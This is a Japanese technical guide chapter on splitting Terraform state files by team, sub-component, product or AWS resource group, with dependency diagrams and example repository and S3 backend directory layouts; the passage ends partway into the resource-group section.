\uD83D\uDCC2 prd/09. 中間層の分割 (任意)中間層の分割について中間層の分割は 任意 です。Terraformに携わる管理者が多くなるほど、効力を発揮します。運用チーム責務範囲別 - ★★この分割方法について運用チーム (例：アプリチーム、インフラチーム) のAWSリソースの責務範囲別でtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、各運用チームが互いに影響を受けずに、terraformコマンドの結果を得られるようになります。AWS CloudFormation best practices - AWS CloudFormationTerraform in Action (English Edition)▶ おすすめ度についてAWSドキュメント・著名な書籍で紹介されています\uD83D\uDC40Terraformに携わるチームが複数ある非常に大規模なプロダクトほど効力を発揮します。実際に私も現在進行形で採用しており、非常に実用的と考えています。【チーム別】状態の依存関係図例えば、以下の運用チームに分割した状況と仮定します。frontendチーム (アプリのフロントエンド領域担当)backendチーム (アプリのバックエンド領域担当)sreチーム (インフラ領域担当)ここで仮定した状況では、各チームが管理する tfstate ファイル間で状態が相互に依存しているとします。AWSリソース間の相互依存ではないため、循環参照は起こりません。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: 運用チーム責務範囲別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            frontend[\\"frontend-team-tfstate<br>(CloudFront, S3, など)\\"]            backend[\\"backend-team-tfstate<br>(API Gateway, ElastiCache, RDS, SES, SNS, など)\\"]            sre[\\"sre-team-tfstate<br>(ALB, CloudWatch, EC2, ECS, EKS, IAM, VPC, など)\\"]            frontend-..->sre            backend-..->sre            sre-..->frontend            sre-..->backend        end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【チーム別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合この場合では、運用チーム責務範囲別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-frontend-team-repository/ # frontendチーム├── output.tf # 他の tfstate ファイルから依存される├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── cloudfront.tf├── s3.tf├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境│    ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd/ # Prd環境      ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する      ...\uD83D\uDC31 aws-backend-team-repository/ # backendチーム├── output.tf # 他の tfstate ファイルから依存される├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── elasticache.tf├── ses.tf├── sns.tf├── rds.tf├── \uD83D\uDCC2 tes│    ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg│    ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd      ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する       ...\uD83D\uDC31 aws-sre-team-repository/ # sreチーム├── output.tf # 他の tfstate ファイルから依存される├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── alb.tf├── cloudwatch.tf├── ec2.tf├── ecs.tf├── eks.tf├── iam.tf├── vpc.tf├── \uD83D\uDCC2 tes│    ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg│    ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd      ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する      ...▼ 同じリポジトリの場合この場合では、運用チーム責務範囲別に分割したtfstateファイルを、異なるリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 frontend-team # frontendチーム│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudfront.tf│    ├── s3.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 backend-team # backendチーム│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── elasticache.tf│    ├── ses.tf│    ├── sns.tf│    ├── rds.tf│    ├── \uD83D\uDCC2 tes│    │    ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg│    │    ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd│          ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 sre-team # sreチーム      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから依存される      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── alb.tf      ├── cloudwatch.tf      ├── ec2.tf      ├── ecs.tf      ├── eks.tf      ├── iam.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes      │    ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg      │    ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd           ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する           ...【チーム別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合運用チーム責務範囲別の場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、プロバイダーアカウント別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 frontend-team│    └── terraform.tfstate # frontendチームの状態を持つ│├── \uD83D\uDCC2 backend-team│    └── terraform.tfstate # backendチームの状態を持つ│└── \uD83D\uDCC2 sre-team      └── terraform.tfstate # sreチームの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...プロダクトのサブコンポーネント別 - ★★この分割方法についてプロダクトのサブコンポーネント (例：アプリ、ネットワーク、認証/認可、監視、など) 別でtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、サブコンポーネントの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。Things to Know Before Working With Terraform – Part 1 | EndavaTerraform organization — Part I : What if you split your components ? | by Amine Charot | Medium▶ おすすめ度についてコンポーネントは、分けようと思えばいくらでも細分化できてしまいます。細分化した数だけterraform_remote_stateブロック地獄になっていくため、適切な数 (3〜5個くらい) にしておくように注意が必要です。この分割方法は、後述のAWSリソースの種類グループとごっちゃになってしまう場合があるため、プロダクトのサブコンポーネントとして意識的に分割させる必要があります\uD83D\uDC4D【サブコンポーネント別】状態の依存関係図例えば、以下のサブコンポーネントに分割した状況と仮定します。application (Web3層系)auth (認証/認可系)monitor (監視系)network (ネットワーク系)ここで仮定した状況では、各プロダクトの tfstate ファイルの依存は一方向最終的に、networkサブコンポーネントやauthサブコンポーネントの tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: プロダクトのサブコンポーネント別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            application[\\"application-tfstate<br>Web3層と周辺AWSリソース<br>(ALB, APIGateway, CloudFront, EC2, ECS, EKS, RDS, S3, SNS, など)\\"]            auth[\\"auth-tfstate<br>(IAMなど)\\"]            monitor[\\"monitor-tfstate<br>(CloudWatch, など)\\"]            network[\\"network-tfstate<br>(Route53, VPC, など)\\"]            application-..->network            application-..->auth            monitor-..->application        end        subgraph stg-bucket            stg[\\"tfstate\\"]        end        subgraph prd-bucket            prd[\\"tfstate\\"]        end        end【サブコンポーネント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合プロダクトのサブコンポーネント別の分割パターンの場合、異なるリポジトリで管理するとリポジトリが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリポジトリの場合この場合では、プロダクトのサブコンポーネント別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 application/│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ├── alb.tf│    ├── cloudfront.tf│    ├── ec2.tf│    ├── ecs.tf│    ├── eks.tf│    ├── ses.tf│    ├── sns.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 auth/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── iam.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 monitor/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudwatch.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 network      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから依存される      ├── route53.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境           ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する           ...【サブコンポーネント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合プロダクトのサブコンポーネント別の分割パターンの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、プロダクトのサブコンポーネント別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 application│    └── terraform.tfstate # applicationコンポーネントの状態を持つ│├── \uD83D\uDCC2 auth│    └── terraform.tfstate # authコンポーネントの状態を持つ│├── \uD83D\uDCC2 monitor│    └── terraform.tfstate # monitorコンポーネントの状態を持つ│└── \uD83D\uDCC2 network      └── terraform.tfstate # networkコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...運用チーム責務範囲別 \xd7 プロダクトサブコンポーネント別 - ★この分割方法について運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせてtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、各運用チーム内のサブコンポーネントの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。▶ おすすめ度について【チーム別 \xd7 サブコンポーネント別】状態の依存関係図以下の運用チームに分割した状況と仮定します。また、各運用チームでTerraformを変更できる管理者が相当数するため、プロダクトのサブコンポーネント別にも分割したとします。frontendチームapplicationmonitorbackendチームapplicationmonitorsreチームapplicationauthmonitornetworkここで仮定した状況では、各プロダクトのtfstateファイルの依存は一方向最終的に、sreチームの管理する tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: 運用チーム責務範囲別 \xd7 プロダクトサブコンポーネント別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            subgraph frontend-team               frontendApplication[\\"application-tfstate<br>(CloudFront, S3, など)\\"]               frontendMonitor[\\"monitor-tfstate<br>(CloudWatch, など)\\"]            end            subgraph backend-team                backendApplication[\\"application-tfstate<br>(API Gateway, ElastiCache, RDS, SES, SNS, など)\\"]                backendMonitor[\\"monitor-tfstate<br>(CloudWatch, など)\\"]            end            subgraph sre-team                sreApplication[\\"application-tfstate<br>Web3層と周辺AWSリソース<br>(ALB, EC2, ECS, EKS, SNS, など)\\"]                auth[\\"auth-tfstate<br>(IAM, など)\\"]                sreMonitor[\\"monitor-tfstate<br>(CloudWatch, など)\\"]                network[\\"network-tfstate<br>(Route53, VPC, など)\\"]            end            frontendApplication-...->network            sreApplication-...->auth            sreApplication-...->network            backendApplication-...->auth            backendApplication-...->network            frontendMonitor-...->frontendApplication            sreMonitor-...->sreApplication            backendMonitor-...->backendApplication        end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【チーム別 \xd7 サブコンポーネント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合この場合では、運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせて分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-frontend-team-repository/├── \uD83D\uDCC2 application/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudfront.tf│    ├── ses.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # frontendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # frontendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # frontendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 monitor/      ├── provider.tf      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── cloudwatch.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # frontendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # frontendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境            ├── backend.tfvars # frontendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する            ...\uD83D\uDC31 aws-backend-team-repository/├── \uD83D\uDCC2 application/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── api_gateway.tf│    ├── elasticache.tf│    ├── rds.tf│    ├── ses.tf│    ├── sns.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # backendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # backendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # backendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 monitor/      ├── provider.tf      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── cloudwatch.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # backendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # backendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境            ├── backend.tfvars # backendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する            ...\uD83D\uDC31 aws-sre-team-repository/├── \uD83D\uDCC2 application/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── alb.tf│    ├── ec2.tf│    ├── ecs.tf│    ├── eks.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # sreチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # sreチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # sreチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 auth/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── iam.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # sreチームが管理するauthコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # sreチームが管理するauthコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # sreチームが管理するauthコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 monitor/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudwatch.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # sreチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # sreチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # sreチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 network      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから依存される      ├── route53.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # sreチームが管理するnetworkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # sreチームが管理するnetworkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境            ├── backend.tfvars # sreチームが管理するnetworkコンポーネントの状態を持つ tfstate ファイルを指定する            ...▼ 同じリポジトリの場合運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせる分割パターンの場合、同じリポジトリで管理するとリポジトリが巨大になってしまいます。そのため、これはお勧めしません。【チーム別 \xd7 サブコンポーネント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせる分割パターンの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせて分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 frontend-team│    ├── \uD83D\uDCC2 application│    │    └── terraform.tfstate # frontendチームが管理するapplicationコンポーネントの状態を持つ│    ││    └── \uD83D\uDCC2 monitor│         └── terraform.tfstate # frontendチームが管理するmonitorコンポーネントの状態を持つ│├── \uD83D\uDCC2 backend-team│    ├── \uD83D\uDCC2 application│    │    └── terraform.tfstate # backendチームが管理するapplicationコンポーネントの状態を持つ│    ││    └── \uD83D\uDCC2 monitor│          └── terraform.tfstate # backendチームが管理するmonitorコンポーネントの状態を持つ│└── \uD83D\uDCC2 sre-team      ├── \uD83D\uDCC2 application      │    └── terraform.tfstate # sreチームが管理するapplicationコンポーネントの状態を持つ      │      ├── \uD83D\uDCC2 auth      │    └── terraform.tfstate # sreチームが管理するauthコンポーネントの状態を持つ      │      ├── \uD83D\uDCC2 monitor      │    └── terraform.tfstate # sreチームが管理するmonitorコンポーネントの状態を持つ      │      └── \uD83D\uDCC2 network            └── terraform.tfstate # sreチームが管理するnetworkコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...同じテナント内のプロダクト別この分割方法について同じテナント (例：同じAWSアカウントの同じVPC) 内に複数の小さなプロダクトがある場合、プロダクト別でtfstateファイルを分割し、中間層もこれに基づいて設計します。ここでいうプロダクトは、アプリを動かすプラットフォーム (例：EKS、ECS、AppRunner、EC2) とそれを取り巻くAWSリソースを指しています。この分割方法により、各プロダクトの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。▶ おすすめ度についてAWSの設計プラクティスとしてプロダクトごとにVPCを分けた方がよいため、この分割方法を採用することは少ないかもしれません。ただ現実として、各プロダクトの使用するIPアドレス数が少なく、またプロダクト別にVPCを分割するのが煩雑という現場はあります\uD83D\uDE2D【同じテナント内のプロダクト】状態の依存関係図例えば、以下のプロダクトに分割した状況と仮定します。fooプロダクトbarプロダクト共有networkコンポーネント (例：VPC、Route53)ここで仮定した状況では、各プロダクトの tfstate ファイルの依存は一方向最終的に、共有networkコンポーネントの tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: 同じテナント内のプロダクト---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            foo-product[\\"foo-product-tfstate<br>(アプリを動かすプラットフォームのAWSリソース)\\"]-..->network            bar-product[\\"bar-product-tfstate<br>(アプリを動かすプラットフォームのAWSリソース)\\"]-..->network            network[\\"network-tfstate<br>(Route53, VPC)\\"]        end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【同じテナント内のプロダクト】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合この場合では、同じテナント内のプロダクトに分割したtfstateファイルを、異なるリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。# fooプロダクトの tfstate ファイルのリポジトリ\uD83D\uDC31 aws-foo-product-repository/├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境│    ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd/ # Prd環境      ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する      ...# barプロダクトの tfstate ファイルのリポジトリ\uD83D\uDC31 aws-bar-product-repository/├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境│    ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd/ # Prd環境      ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する      ...# 共有networkコンポーネントの tfstate ファイルのリポジトリ\uD83D\uDC31 aws-network-repository/├── output.tf # 他の tfstate ファイルから依存される├── provider.tf├── route53.tf├── vpc.tf├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境│    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd/ # Prd環境      ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      ...▼ 同じリポジトリの場合この場合では、同じテナント内のプロダクトに分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 foo-product/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 bar-product/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 network      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから依存される      ├── route53.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境           ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する           ...【同じテナント内のプロダクト】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合同じテナント内のプロダクトの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、同じテナント内のプロダクトに分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 foo-product│    └── terraform.tfstate # fooプロダクトの状態を持つ│├── \uD83D\uDCC2 bar-product│    └── terraform.tfstate # barプロダクトの状態を持つ│└── \uD83D\uDCC2 network      └── terraform.tfstate # networkコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...AWSリソースの種類グループ別この分割方法についてAWSリソースの種類グループ別でtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、各AWSリソースの種類グループも管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。▶ おすすめ度についてAWSリソースの種類グループは、分けようと思えばいくらでも細分化できてしまいます。細分化した数だけterraform_remote_stateブロック地獄になっていくため、適切な数 (3〜5個くらい) にしておくように注意が必要です。特にこの分割方法は、グループ数がどんどん増えていく可能性があります\uD83D\uDE07【種類グループ別】状態の依存関係図例えば、以下の種類グループに分割した状況と仮定します。application 